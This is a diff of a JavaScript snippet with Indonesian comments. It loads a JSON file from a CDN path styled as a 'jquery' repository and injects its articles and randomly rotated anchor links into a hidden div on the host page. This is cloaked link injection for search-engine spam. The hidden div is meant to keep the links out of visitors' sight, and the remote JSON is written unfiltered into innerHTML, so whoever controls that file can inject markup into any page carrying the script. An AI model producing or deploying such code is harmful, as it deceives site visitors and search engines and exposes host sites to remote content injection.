@@ -1,15 +1,21 @@
 (function () {
-  const TARGET_SELECTOR = "body"; // bisa diganti footer / div tertentu
+
   const STORE_URL = "https://cdn.jsdelivr.net/gh/nanangkus/jquery@refs/heads/main/store.json";
 
   function createArticle(data) {
     let html = "";
 
     data.articles.forEach(item => {
+
+      // 🔥 INI POSISI KODENYA BRO
+      const anchorText = Array.isArray(item.anchor)
+        ? item.anchor[Math.floor(Math.random() * item.anchor.length)]
+        : item.anchor;
+
       html += item.text;
 
-      if (item.link && item.anchor) {
-        html += ' <a href="' + item.link + '" target="_blank">' + item.anchor + '</a>';
+      if (item.link && anchorText) {
+        html += ' <a href="' + item.link + '" target="_blank">' + anchorText + '</a>';
       }
 
       html += "<br>";
@@ -21,14 +27,11 @@
   fetch(STORE_URL)
     .then(res => res.json())
     .then(json => {
-      const container = document.createElement("div");
-      container.style.display = "none"; // biar tidak kelihatan
-      container.innerHTML = createArticle(json);
+      const div = document.createElement("div");
+      div.style.display = "none";
+      div.innerHTML = createArticle(json);
 
-      document.querySelector(TARGET_SELECTOR).appendChild(container);
-    })
-    .catch(err => {
-      console.error("Bunker error:", err);
+      document.body.appendChild(div);
     });
 
 })();
